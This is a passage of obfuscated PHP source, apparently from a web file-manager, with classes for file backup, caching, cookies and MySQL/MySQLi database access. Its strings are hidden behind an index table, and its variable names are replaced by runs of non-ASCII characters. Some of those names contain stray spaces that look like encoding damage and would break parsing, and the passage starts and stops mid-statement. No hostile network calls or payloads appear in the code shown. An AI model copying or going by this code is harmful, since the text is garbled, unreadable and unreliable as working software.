$‡ßğ¯­); if (!$Ç¥’²„‡) { $ßÔ¨£¶->end(); $¿ˆğ’˜° = IO::getLastError($’¶ç§®[812] . $°Òõ¼Ò½[$’¶ç§®[84]] . $’¶ç§®[813] . $‡ßğ¯­ . $’¶ç§®[164]); write_log($¿ˆğ’˜°, $’¶ç§®[790]); return !1; } } $¬öğ“Å¹ = new DbManage(); $â¿ÏŸ–› = $¬öğ“Å¹->getSqlFile(); if (!$â¿ÏŸ–›[$’¶ç§®[814]] || !$â¿ÏŸ–›[$’¶ç§®[13]]) { return !1; } IO::move($â¿ÏŸ–›[$’¶ç§®[814]], $‡ßğ¯­); IO::move($â¿ÏŸ–›[$’¶ç§®[13]], $‡ßğ¯­); $ßÔ¨£¶->end(); $Ã‡ò™Š» = array($’¶ç§®[815] => $ÀÄì¾õ€, $’¶ç§®[816] => time()); Backup::set($Ã‡ò™Š»); return !0; } private function backupPath($ó†—é“õ) { $òšÊ’—Ô =& $_SERVER[ïëó©ÒÚ]; $Ë‡‡ŸŠû = $ó†—é“õ[$òšÊ’—Ô[32]]; $İ’Ç¡ç = Model($òšÊ’—Ô[780])->get($òšÊ’—Ô[781]); $õı¾ùõÏ = substr(md5($òšÊ’—Ô[782] . $İ’Ç¡ç . $Ë‡‡ŸŠû), 0, 8); return "\173\151\157\72{$ó†—é“õ[$òšÊ’—Ô[762]]}\175\x2f\x64\141\164\x61\x62\141\163\145\x2f\142\x61\x63\x6b\x75\160\x2f" . $Ë‡‡ŸŠû . $òšÊ’—Ô[11] . $õı¾ùõÏ; } private function tmpFilesPath() { $øÄá­ı =& $_SERVER[ïëó©ÒÚ]; $Ë§Œ«¼Ú = TEMP_FILES; if ($GLOBALS[$øÄá­ı[6]][$øÄá­ı[89]][$øÄá­ı[806]]) { $Ë§Œ«¼Ú = $GLOBALS[$øÄá­ı[6]][$øÄá­ı[89]][$øÄá­ı[806]]; if (!mk_dir($Ë§Œ«¼Ú) || !is_writable($Ë§Œ«¼Ú) || !IO::mkfile($Ë§Œ«¼Ú . $øÄá­ı[807])) { $Ë§Œ«¼Ú = TEMP_FILES; } } return $Ë§Œ«¼Ú; } } class BackupFile { public function __construct() { } public function index() { $“É´Òºé = Backup::get(); $¾Ûñ¯±Ä = $“É´Òºé[$_SERVER[ïëó©ÒÚ][293]][$_SERVER[ïëó©ÒÚ][199]][$_SERVER[ïëó©ÒÚ][477]]; $ °øºÜ = array($_SERVER[ïëó©ÒÚ][478] => array($_SERVER[ïëó©ÒÚ][817], $¾Ûñ¯±Ä), $_SERVER[ïëó©ÒÚ][818] => array($_SERVER[ïëó©ÒÚ][331], $“É´Òºé[$_SERVER[ïëó©ÒÚ][762]])); $¥âÂ°Ï = (int) Model($_SERVER[ïëó©ÒÚ][799])->where($ °øºÜ)->count($_SERVER[ïëó©ÒÚ][477]); $¹Üùò¦Ó = (int) Model($_SERVER[ïëó©ÒÚ][799])->where($ °øºÜ)->sum($_SERVER[ïëó©ÒÚ][76]); $¦şƒõùæ = new TaskFileTransfer($_SERVER[ïëó©ÒÚ][819], $_SERVER[ïëó©ÒÚ][790], $¥âÂ°Ï, LNG($_SERVER[ïëó©ÒÚ][791]) . $_SERVER[ïëó©ÒÚ][792] . LNG($_SERVER[ïëó©ÒÚ][820])); $¦şƒõùæ->task[$_SERVER[ïëó©ÒÚ][773]] = $¹Üùò¦Ó; $èî•û´¤ = array($_SERVER[ïëó©ÒÚ][821] => $¥âÂ°Ï, $_SERVER[ïëó©ÒÚ][822] => $¹Üùò¦Ó, $_SERVER[ïëó©ÒÚ][823] => time()); Backup::set($èî•û´¤); $ì¨°İ€¬ = !0; $Ø– °·Ç = $this->storeIds(); $©Ëå©»Ô = 1; $ıúÌ…éõ = 1000; $Õ­ÊÛéŠ = $ÆÆùö¿ã = 0; $šË©È ¸ = array(); $çÕ‡ûò = $¨ïº³°Å = 0; do { $Ÿ„Ö˜Ì = $_SERVER[ïëó©ÒÚ][824]; $ôî­é«™ = Model($_SERVER[ïëó©ÒÚ][799])->where($ °øºÜ)->field($Ÿ„Ö˜Ì)->order($_SERVER[ïëó©ÒÚ][825])->selectPage($ıúÌ…éõ, $©Ëå©»Ô); $Á³•ÈÃ’ = !empty($ôî­é«™[$_SERVER[ïëó©ÒÚ][369]]) ? $ôî­é«™[$_SERVER[ïëó©ÒÚ][369]] : array(); foreach ($Á³•ÈÃ’ as $±éºš¡Å) { if (!$this->_fileExist($±éºš¡Å, $šË©È ¸, $Ø– °·Ç)) { $¥âÂ°Ï -= 1; $¹Üùò¦Ó -= (int) $±éºš¡Å[$_SERVER[ïëó©ÒÚ][76]]; write_log("\x66\x69\x6c\145\x20\x6e\x6f\164\40\x65\x78\151\163\x74\56\146\x69\154\x65\x49\104\x3a{$±éºš¡Å[$_SERVER[ïëó©ÒÚ][477]]}\x2c\40\x70\x61\x74\150\72{$±éºš¡Å[$_SERVER[ïëó©ÒÚ][84]]}", $_SERVER[ïëó©ÒÚ][826]); continue; } $ÖãõÂø = $±éºš¡Å[$_SERVER[ïëó©ÒÚ][84]]; $È²şË™é = "\173\x69\x6f\x3a{$“É´Òºé[$_SERVER[ïëó©ÒÚ][762]]}\175" . substr($ÖãõÂø, strlen("\x7b\151\x6f\x3a{$±éºš¡Å[$_SERVER[ïëó©ÒÚ][827]]}\175")); if (IO::exist($È²şË™é)) { $¦şƒõùæ->updateFileEnd($±éºš¡Å[$_SERVER[ïëó©ÒÚ][32]], $±éºš¡Å[$_SERVER[ïëó©ÒÚ][76]]); } else { $È²şË™é = get_path_father($È²şË™é); IO::mkdir($È²şË™é); if (!IO::copy($ÖãõÂø, $È²şË™é, $_SERVER[ïëó©ÒÚ][828])) { write_log($_SERVER[ïëó©ÒÚ][829] . $ÖãõÂø . $_SERVER[ïëó©ÒÚ][813] . $È²şË™é . $_SERVER[ïëó©ÒÚ][164], $_SERVER[ïëó©ÒÚ][790]); $ì¨°İ€¬ = !1; break; } } $¾Ûñ¯±Ä = $±éºš¡Å[$_SERVER[ïëó©ÒÚ][477]]; $ÆÆùö¿ã += 1; $Õ­ÊÛéŠ += $±éºš¡Å[$_SERVER[ïëó©ÒÚ][76]]; $¨ïº³°Å += 1; $çÕ‡ûò += $±éºš¡Å[$_SERVER[ïëó©ÒÚ][76]]; if ($Õ­ÊÛéŠ >= 1024 * 1024 * 100) { $èî•û´¤ = array($_SERVER[ïëó©ÒÚ][830] => $¾Ûñ¯±Ä, $_SERVER[ïëó©ÒÚ][831] => $¨ïº³°Å, $_SERVER[ïëó©ÒÚ][832] => $çÕ‡ûò); Backup::set($èî•û´¤); $Õ­ÊÛéŠ = $ÆÆùö¿ã = 0; } } $ı´†¡¿¯ = count($Á³•ÈÃ’); $©Ëå©»Ô++; } while ($ı´†¡¿¯ == $ıúÌ…éõ); $¦şƒõùæ->end(); $èî•û´¤ = array($_SERVER[ïëó©ÒÚ][833] => 1, $_SERVER[ïëó©ÒÚ][506] => time(), $_SERVER[ïëó©ÒÚ][785] => 1, $_SERVER[ïëó©ÒÚ][830] => $¾Ûñ¯±Ä, $_SERVER[ïëó©ÒÚ][822] => $¹Üùò¦Ó, $_SERVER[ïëó©ÒÚ][821] => $¥âÂ°Ï, $_SERVER[ïëó©ÒÚ][834] => time()); if ($ÆÆùö¿ã) { $èî•û´¤[$_SERVER[ïëó©ÒÚ][831]] = $¨ïº³°Å; $èî•û´¤[$_SERVER[ïëó©ÒÚ][832]] = $çÕ‡ûò; } Backup::set($èî•û´¤); $this->_fileFilter($šË©È ¸); return !0; } private function _fileExist($ñ®ú¼°ë, &$Š¿ùºàÎ, $“‹¸Ğ±) { $à¾ÒÄ =& $_SERVER[ïëó©ÒÚ]; $œ„ç­ëñ = $ñ®ú¼°ë[$à¾ÒÄ[84]]; if (in_array($ñ®ú¼°ë[$à¾ÒÄ[477]], $Š¿ùºàÎ)) { return !1; } if (!in_array($ñ®ú¼°ë[$à¾ÒÄ[827]], $“‹¸Ğ±)) { return !1; } if (IO::exist($œ„ç­ëñ)) { return !0; } $Ğ¨á…îœ = get_path_father($œ„ç­ëñ); if (IO::exist($Ğ¨á…îœ)) { $Š¿ùºàÎ[] = $ñ®ú¼°ë[$à¾ÒÄ[477]]; return !1; } $ÇÈÕú = array($à¾ÒÄ[827] => $ñ®ú¼°ë[$à¾ÒÄ[827]], $à¾ÒÄ[84] => array($à¾ÒÄ[383], "{$Ğ¨á…îœ}\45")); $Â¼ºÕÀ© = Model($à¾ÒÄ[799])->where($ÇÈÕú)->field($à¾ÒÄ[478])->select(); $Š¿ùºàÎ = array_merge($Š¿ùºàÎ, array_to_keyvalue($Â¼ºÕÀ©, $à¾ÒÄ[12], $à¾ÒÄ[477])); return !1; } private function _fileFilter($Ùïš€ÖÌ) { $Ö‡­ïÀÆ =& $_SERVER[ïëó©ÒÚ]; if (empty($Ùïš€ÖÌ)) { return; } $Ü¦«üş× = array($Ö‡­ïÀÆ[477] => array($Ö‡­ïÀÆ[7], array_unique($Ùïš€ÖÌ))); $ùÓú’‡Š = Model($Ö‡­ïÀÆ[835])->where($Ü¦«üş×)->field($Ö‡­ïÀÆ[411])->select(); foreach ($ùÓú’‡Š as $ĞÃ¤£ûñ) { Model($Ö‡­ïÀÆ[835])->remove($ĞÃ¤£ûñ[$Ö‡­ïÀÆ[411]], !1); } } private function storeIds() { $µğŸâ§½ =& $_SERVER[ïëó©ÒÚ]; $­àóòèË = Model($µğŸâ§½[777])->listData(); $ã’Äû = array(); $Ïí¬ƒ†° = $GLOBALS[$µğŸâ§½[6]][$µğŸâ§½[89]][$µğŸâ§½[836]]; foreach ($­àóòèË as $ÑÏÅş›Æ) { $”¥Œ¸Ú§ = strtolower($ÑÏÅş›Æ[$µğŸâ§½[95]]); if (!isset($Ïí¬ƒ†°[$”¥Œ¸Ú§])) { continue; } $ãñŸÀ©œ = $µğŸâ§½[74] . (isset($Ïí¬ƒ†°[$”¥Œ¸Ú§]) ? $Ïí¬ƒ†°[$”¥Œ¸Ú§] : ucfirst($”¥Œ¸Ú§)); if (!class_exists($ãñŸÀ©œ)) { continue; } $ã’Äû[] = $ÑÏÅş›Æ[$µğŸâ§½[399]]; } return $ã’Äû; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $²²ÊÙ¢ä =& $_SERVER[ïëó©ÒÚ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $”©ø”Â’ = $GLOBALS[$²²ÊÙ¢ä[6]][$²²ÊÙ¢ä[349]]; $×æ”·ÎÏ = $”©ø”Â’[$”©ø”Â’[$²²ÊÙ¢ä[837]]]; $¿¼Ì£û = $”©ø”Â’[$²²ÊÙ¢ä[838]]; switch ($”©ø”Â’[$²²ÊÙ¢ä[837]]) { case $²²ÊÙ¢ä[21]: self::$handle = Model($²²ÊÙ¢ä[839]); break; case $²²ÊÙ¢ä[840]: self::$handle = new CacheRedis($×æ”·ÎÏ, $¿¼Ì£û); break; case $²²ÊÙ¢ä[841]: self::$handle = new CacheMemcached($×æ”·ÎÏ, $¿¼Ì£û); break; case $²²ÊÙ¢ä[199]: self::$handle = new CacheFile($×æ”·ÎÏ, $¿¼Ì£û); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($›Ì«·Ç˜) { if (is_array($›Ì«·Ç˜) || is_object($›Ì«·Ç˜)) { $›Ì«·Ç˜ = json_encode($›Ì«·Ç˜); } $›Ì«·Ç˜ = rawurlencode($›Ì«·Ç˜); return md5(KOD_SITE_ID . $_SERVER[ïëó©ÒÚ][11] . $›Ì«·Ç˜); } public static function get($÷Ô øŸ, $è®ôšÄ© = false) { $¨ÊùáÉ¹ = self::key($÷Ô øŸ); if ($è®ôšÄ©) { return unserialize(self::init()->get($¨ÊùáÉ¹)); } if (!isset(self::$memoryCache[$¨ÊùáÉ¹])) { $’ï‚¥¯Æ = self::init()->get($¨ÊùáÉ¹); self::$memoryCache[$¨ÊùáÉ¹] = unserialize($’ï‚¥¯Æ); } return self::$memoryCache[$¨ÊùáÉ¹]; } public static function set($æë²Í¶, $ü¤ìŒíµ, $–“©Ë›³ = false) { $€Ú„ò’ = self::key($æë²Í¶); if (isset(self::$memoryCache[$€Ú„ò’]) && self::$memoryCache[$€Ú„ò’] === $ü¤ìŒíµ) { return !0; } if ($–“©Ë›³ === 0) { self::$memoryCache[$€Ú„ò’] = $ü¤ìŒíµ; return !0; } CacheLock::lock($æë²Í¶); $²ÈåŞ£Š = self::init()->set($€Ú„ò’, serialize($ü¤ìŒíµ), $–“©Ë›³); self::$memoryCache[$€Ú„ò’] = $ü¤ìŒíµ; CacheLock::unlock($æë²Í¶); return $²ÈåŞ£Š; } public static function getCall($Ä›¯ÚÁã, $Ö‚âèëë, $‘íàÚç¬, $ØÉ­¿ŒÄ = array()) { $Ú¥üÑ­› =& $_SERVER[ïëó©ÒÚ]; $ĞÈÖ¸ü = self::get($Ä›¯ÚÁã); if ($ĞÈÖ¸ü || $ĞÈÖ¸ü === $Ú¥üÑ­›[12]) { return $ĞÈÖ¸ü; } $ĞÈÖ¸ü = call_user_func_array($‘íàÚç¬, $ØÉ­¿ŒÄ); $ĞÈÖ¸ü = $ĞÈÖ¸ü ? $ĞÈÖ¸ü : $Ú¥üÑ­›[12]; self::set($Ä›¯ÚÁã, $ĞÈÖ¸ü, $Ö‚âèëë); return $ĞÈÖ¸ü; } public static function remove($¥Œì“ï) { $‡â·ò = self::key($¥Œì“ï); unset(self::$memoryCache[$‡â·ò]); self::clearTimeout(); CacheLock::lock($¥Œì“ï); $¡ÚÀı¼Ò = self::init()->remove($‡â·ò); CacheLock::unlock($¥Œì“ï); return $¡ÚÀı¼Ò; } public static function removeMemory($üöŸşìÂ) { $èÅîØˆ = self::key($üöŸşìÂ); unset(self::$memoryCache[$èÅîØˆ]); } public static function clearMemory($´âÆ¨¿Ÿ = false) { if ($´âÆ¨¿Ÿ) { $´âÆ¨¿Ÿ = self::key($´âÆ¨¿Ÿ); unset(self::$memoryCache[$´âÆ¨¿Ÿ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ïëó©ÒÚ][842])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ïëó©ÒÚ][843])) { self::init()->clearTimeout(); } } } goto Dô¹‡Ğ¦»˜; aˆÕáì­ë›: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÄÍ‡Š•È = '', $¶úÀî‚ô = 0) { if (is_string($ÄÍ‡Š•È) && $ÄÍ‡Š•È != $_SERVER[ïëó©ÒÚ][12]) { $this->prefix = $ÄÍ‡Š•È; } if (is_numeric($¶úÀî‚ô) && $¶úÀî‚ô > 0) { $this->expire = $¶úÀî‚ô; } } public static function getInstance() { static $Â¬¹Ş½›; if ($Â¬¹Ş½› === null) { $Â¬¹Ş½› = new self(); } return $Â¬¹Ş½›; } private static $cookieDisable = false; public static function disable($ìºğ¢ùÜ) { self::$cookieDisable = $ìºğ¢ùÜ; } private static $sameCookieSet = array(); public static function set($ŒĞ Ì‰ô, $Éà¿õÄø, $§Å¬äÏÇ = 0, $œäí™ûµ = false, $»Œ÷ÌË® = false) { $«Ï˜¡ì =& $_SERVER[ïëó©ÒÚ]; if (self::$cookieDisable) { return; } if (!$§Å¬äÏÇ) { $§Å¬äÏÇ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ŒĞ Ì‰ô]) && self::$sameCookieSet[$ŒĞ Ì‰ô] == $Éà¿õÄø . $§Å¬äÏÇ) { return; } self::$sameCookieSet[$ŒĞ Ì‰ô] = $Éà¿õÄø . $§Å¬äÏÇ; if (!$»Œ÷ÌË®) { $»Œ÷ÌË® = str_replace(HOST, $«Ï˜¡ì[12], APP_HOST); $»Œ÷ÌË® = _get($GLOBALS, $«Ï˜¡ì[885], $»Œ÷ÌË®); } $£¹§·¨ = $«Ï˜¡ì[12]; setcookie($ŒĞ Ì‰ô, $Éà¿õÄø, time() + $§Å¬äÏÇ, $«Ï˜¡ì[8] . trim($»Œ÷ÌË®, $«Ï˜¡ì[8]) . $£¹§·¨, !1, !1, $œäí™ûµ); } public static function setSafe($Œ«ÜÙ†ª, $–ù¨Ø, $öß›ñÊ = 0) { self::set($Œ«ÜÙ†ª, $–ù¨Ø, $öß›ñÊ, !0); } public static function get($Û«¹¢ÜÀ) { static $Ã¸ù³¡ = false; if (!$Ã¸ù³¡) { self::initHeaderCookie(); $Ã¸ù³¡ = !0; } return isset($_COOKIE[$Û«¹¢ÜÀ]) ? $_COOKIE[$Û«¹¢ÜÀ] : !1; } private static function initHeaderCookie() { $ŸÎÃ€¹Ú =& $_SERVER[ïëó©ÒÚ]; if (!isset($_SERVER[$ŸÎÃ€¹Ú[886]]) || !$_SERVER[$ŸÎÃ€¹Ú[886]]) { return; } $í«êËò = explode($ŸÎÃ€¹Ú[71], $_SERVER[$ŸÎÃ€¹Ú[886]]); foreach ($í«êËò as $üáŒ•Â) { $üáŒ•Â = explode($ŸÎÃ€¹Ú[887], $üáŒ•Â); if (count($üáŒ•Â) != 2 || !isset($üáŒ•Â[1])) { continue; } $_COOKIE[trim($üáŒ•Â[0])] = trim($üáŒ•Â[1]); } } public static function remove($Ÿå‹«îÜ, $ƒŞÜ©¯÷ = false) { unset($_COOKIE[$Ÿå‹«îÜ]); self::set($Ÿå‹«îÜ, $_SERVER[ïëó©ÒÚ][12], 1, $ƒŞÜ©¯÷); } } class DbMysql extends Db { public function __construct($¼ºµ³¶ = '') { $°¢¦àâ™ =& $_SERVER[ïëó©ÒÚ]; if (!extension_loaded($°¢¦àâ™[814])) { think_exception(think_lang($°¢¦àâ™[14]) . $°¢¦àâ™[888]); } if (!empty($¼ºµ³¶)) { $this->config = $¼ºµ³¶; if (empty($this->config[$°¢¦àâ™[17]])) { $this->config[$°¢¦àâ™[17]] = $°¢¦àâ™[12]; } } } public function connect($«×•Â¬Ó = '', $œÉ€¤èÒ = 0, $›ÑøĞè‰ = false) { $ü®õåã› =& $_SERVER[ïëó©ÒÚ]; if (!isset($this->linkID[$œÉ€¤èÒ])) { if (empty($«×•Â¬Ó)) { $«×•Â¬Ó = $this->config; } $•í…‚ˆ = $«×•Â¬Ó[$ü®õåã›[889]] . ($«×•Â¬Ó[$ü®õåã›[890]] ? "\72{$«×•Â¬Ó[$ü®õåã›[890]]}" : $ü®õåã›[12]); $–„Ô = !empty($«×•Â¬Ó[$ü®õåã›[17]][$ü®õåã›[18]]) ? $«×•Â¬Ó[$ü®õåã›[17]][$ü®õåã›[18]] : $this->pconnect; if ($–„Ô) { $this->linkID[$œÉ€¤èÒ] = mysql_pconnect($•í…‚ˆ, $«×•Â¬Ó[$ü®õåã›[891]], $«×•Â¬Ó[$ü®õåã›[892]], 131072); } else { $this->linkID[$œÉ€¤èÒ] = mysql_connect($•í…‚ˆ, $«×•Â¬Ó[$ü®õåã›[891]], $«×•Â¬Ó[$ü®õåã›[892]], !0, 131072); } if (!$this->linkID[$œÉ€¤èÒ] || !empty($«×•Â¬Ó[$ü®õåã›[21]]) && !mysql_select_db($«×•Â¬Ó[$ü®õåã›[21]], $this->linkID[$œÉ€¤èÒ])) { think_exception(mysql_error()); } $ŒŒç–’Ù = mysql_get_server_info($this->linkID[$œÉ€¤èÒ]); mysql_query($ü®õåã›[893] . think_config($ü®õåã›[894]) . $ü®õåã›[58], $this->linkID[$œÉ€¤èÒ]); if ($ŒŒç–’Ù > $ü®õåã›[895]) { mysql_query($ü®õåã›[896], $this->linkID[$œÉ€¤èÒ]); } $this->connected = !0; if (1 != think_config($ü®õåã›[22])) { unset($this->config); } } return $this->linkID[$œÉ€¤èÒ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ëÍÌÉËÎ) { $å˜ÉÈ˜ˆ =& $_SERVER[ïëó©ÒÚ]; if (0 === stripos($ëÍÌÉËÎ, $å˜ÉÈ˜ˆ[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ëÍÌÉËÎ; if ($this->queryID) { $this->free(); } think_action_status($å˜ÉÈ˜ˆ[23], 1); think_status($å˜ÉÈ˜ˆ[24]); $this->queryID = mysql_query($ëÍÌÉËÎ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($€ÃÃŠã©) { $®ã°şÕµ =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€ÃÃŠã©; if ($this->queryID) { $this->free(); } think_action_status($®ã°şÕµ[25], 1); think_status($®ã°şÕµ[24]); $ª¹İÅÍ = mysql_query($€ÃÃŠã©, $this->_linkID); $this->debug(); if (!1 === $ª¹İÅÍ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ïëó©ÒÚ][897], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¨Ãõæ®Ö = mysql_query($_SERVER[ïëó©ÒÚ][898], $this->_linkID); $this->transTimes = 0; if (!$¨Ãõæ®Ö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢¨†ˆÑˆ = mysql_query($_SERVER[ïëó©ÒÚ][899], $this->_linkID); $this->transTimes = 0; if (!$¢¨†ˆÑˆ) { $this->error(); return !1; } } return !0; } private function getAll() { $Üõ•„Ú¹ = array(); if ($this->numRows > 0) { while ($À“°”³Ò = mysql_fetch_assoc($this->queryID)) { $Üõ•„Ú¹[] = $À“°”³Ò; } mysql_data_seek($this->queryID, 0); } return $Üõ•„Ú¹; } public function getFields($—Çéµ¿¤) { $âëäú’‹ =& $_SERVER[ïëó©ÒÚ]; $º–Œ¤“¤ = $this->query($âëäú’‹[900] . $this->parseKey($—Çéµ¿¤)); $¶˜Ş¢ùÙ = array(); if ($º–Œ¤“¤) { foreach ($º–Œ¤“¤ as $¹‚‹•è‹ => $‘±êÒ‹æ) { $¶˜Ş¢ùÙ[$‘±êÒ‹æ[$âëäú’‹[31]]] = array($âëäú’‹[32] => $‘±êÒ‹æ[$âëäú’‹[31]], $âëäú’‹[33] => $‘±êÒ‹æ[$âëäú’‹[34]], $âëäú’‹[35] => (bool) (strtoupper($‘±êÒ‹æ[$âëäú’‹[36]]) === $âëäú’‹[901]), $âëäú’‹[37] => $‘±êÒ‹æ[$âëäú’‹[38]], $âëäú’‹[39] => strtolower($‘±êÒ‹æ[$âëäú’‹[40]]) == $âëäú’‹[41], $âëäú’‹[42] => strtolower($‘±êÒ‹æ[$âëäú’‹[43]]) == $âëäú’‹[44]); } } return $¶˜Ş¢ùÙ; } public function getTables($üØ€ââ• = '') { $‰ÌØ”± =& $_SERVER[ïëó©ÒÚ]; if (!empty($üØ€ââ•)) { $ˆÄó¥¦ş = $‰ÌØ”±[902] . $üØ€ââ• . $‰ÌØ”±[903]; } else { $ˆÄó¥¦ş = $‰ÌØ”±[904]; } $­†»„ = $this->query($ˆÄó¥¦ş); $»ãï‹ì = array(); foreach ($­†»„ as $ÙÚ§ç¬ => $êÅ´§ƒÓ) { $»ãï‹ì[$ÙÚ§ç¬] = current($êÅ´§ƒÓ); } return $»ãï‹ì; } public function replace($ÃîÖèĞæ, $÷ßŒù³ = array()) { $‰È˜ô°¨ =& $_SERVER[ïëó©ÒÚ]; foreach ($ÃîÖèĞæ as $û¨€¶‡¥ => $´¢õòˆ) { $¹õ°à¼§ = $this->parseValue($´¢õòˆ); if (is_scalar($¹õ°à¼§)) { $–÷ö‹èĞ[] = $¹õ°à¼§; $•œÎ‰Ã [] = $this->parseKey($û¨€¶‡¥); } } $™ö±äö = $‰È˜ô°¨[905] . $this->parseTable($÷ßŒù³[$‰È˜ô°¨[279]]) . $‰È˜ô°¨[906] . implode($‰È˜ô°¨[50], $•œÎ‰Ã ) . $‰È˜ô°¨[907] . implode($‰È˜ô°¨[50], $–÷ö‹èĞ) . $‰È˜ô°¨[908]; return $this->execute($™ö±äö); } public function insertAll($“Â‰ß¢», $ÄÜÀ¹‡ˆ = array(), $®üÍÅ‡É = false) { $ÎŞ‰Ó“ =& $_SERVER[ïëó©ÒÚ]; if (!is_array($“Â‰ß¢»[0])) { return !1; } $Öˆ£ÒÍ‚ = array_keys($“Â‰ß¢»[0]); $Üö‹¬Š = array(); foreach ($“Â‰ß¢» as $å´†æä€) { $ş©Ø‚ƒ = array(); foreach ($å´†æä€ as $ëçç×ßä => $¢‚À¬£Í) { $¢‚À¬£Í = $this->parseValue($¢‚À¬£Í); if (is_scalar($¢‚À¬£Í)) { $ş©Ø‚ƒ[] = $¢‚À¬£Í; } } $Üö‹¬Š[] = $ÎŞ‰Ó“[260] . implode($ÎŞ‰Ó“[50], $ş©Ø‚ƒ) . $ÎŞ‰Ó“[908]; } array_walk($Öˆ£ÒÍ‚, array($this, $ÎŞ‰Ó“[909])); $ãÔÍÆŠ” = ($®üÍÅ‡É ? $ÎŞ‰Ó“[910] : $ÎŞ‰Ó“[911]) . $ÎŞ‰Ó“[912] . $this->parseTable($ÄÜÀ¹‡ˆ[$ÎŞ‰Ó“[279]]) . $ÎŞ‰Ó“[906] . implode($ÎŞ‰Ó“[50], $Öˆ£ÒÍ‚) . $ÎŞ‰Ó“[913] . implode($ÎŞ‰Ó“[50], $Üö‹¬Š); return $this->execute($ãÔÍÆŠ”); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $µÁ§¾± =& $_SERVER[ïëó©ÒÚ]; $this->error = mysql_errno() . $µÁ§¾±[4] . mysql_error($this->_linkID); if ($µÁ§¾±[12] != $this->queryStr) { $this->error .= LNG($µÁ§¾±[48]) . $this->queryStr; } think_trace($this->error, $µÁ§¾±[12], $µÁ§¾±[49]); return $this->error; } public function escapeString($‘ÉÔì Ù) { if ($this->_linkID) { return mysql_real_escape_string($‘ÉÔì Ù, $this->_linkID); } else { return mysql_escape_string($‘ÉÔì Ù); } } public function parseKey(&$ôÍü¿Ä, $ñ‘ò° ¨ = true) { $øìóÌ =& $_SERVER[ïëó©ÒÚ]; if ($ñ‘ò° ¨) { $ôÍü¿Ä = $this->parseKeyCheck($ôÍü¿Ä); } if ($ôÍü¿Ä != $øìóÌ[188] && !preg_match($øìóÌ[914], $ôÍü¿Ä)) { $ôÍü¿Ä = $øìóÌ[385] . trim($ôÍü¿Ä, $øìóÌ[385]) . $øìóÌ[385]; } return $ôÍü¿Ä; } } class DbMysqli extends Db { public function __construct($ªŒ¯¼°œ = '') { $°êûÀ‹‘ =& $_SERVER[ïëó©ÒÚ]; if (!extension_loaded($°êûÀ‹‘[915])) { think_exception(think_lang($°êûÀ‹‘[14]) . $°êûÀ‹‘[916]); } if (!empty($ªŒ¯¼°œ)) { $this->config = $ªŒ¯¼°œ; if (empty($this->config[$°êûÀ‹‘[17]])) { $this->config[$°êûÀ‹‘[17]] = $°êûÀ‹‘[12]; } } } public function connect($¥¼ı›­Ç = '', $¸‚¿Î« = 0) { $÷ú¥ÔÈ¹ =& $_SERVER[ïëó©ÒÚ]; if (!isset($this->linkID[$¸‚¿Î«])) { if (empty($¥¼ı›­Ç)) { $¥¼ı›­Ç = $this->config; } $this->linkID[$¸‚¿Î«] = new mysqli($¥¼ı›­Ç[$÷ú¥ÔÈ¹[889]], $¥¼ı›­Ç[$÷ú¥ÔÈ¹[891]], $¥¼ı›­Ç[$÷ú¥ÔÈ¹[892]], $¥¼ı›­Ç[$÷ú¥ÔÈ¹[21]], $¥¼ı›­Ç[$÷ú¥ÔÈ¹[890]] ? intval($¥¼ı›­Ç[$÷ú¥ÔÈ¹[890]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ßëòå ± = $this->linkID[$¸‚¿Î«]->server_version; $this->linkID[$¸‚¿Î«]->query($÷ú¥ÔÈ¹[893] . think_config($÷ú¥ÔÈ¹[894]) . $÷ú¥ÔÈ¹[58]); if ($ßëòå ± > $÷ú¥ÔÈ¹[895]) { $this->linkID[$¸‚¿Î«]->query($÷ú¥ÔÈ¹[896]); } $this->connected = !0; if (1 != think_config($÷ú¥ÔÈ¹[22])) { unset($this->config); } } return $this->linkID[$¸‚¿Î«]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($©­ãö°€) { $áØ§´¥¹ =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $©­ãö°€; if ($this->queryID) { $this->free(); } think_action_status($áØ§´¥¹[23], 1); think_status($áØ§´¥¹[24]); $this->queryID = $this->_linkID->query($©­ãö°€); if ($this->_linkID->more_results()) { while (($¥ÑúØÛ‹ = $this->_linkID->next_result()) != NULL) { $¥ÑúØÛ‹->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ùÛªñ’Á) { $¼İèÇşì =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ùÛªñ’Á; if ($this->queryID) { $this->free(); } think_action_status($¼İèÇşì[25], 1); think_status($¼İèÇşì[24]); $¬Ñ“¦Åü = $this->_linkID->query($ùÛªñ’Á); $this->debug(); if (!1 === $¬Ñ“¦Åü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = 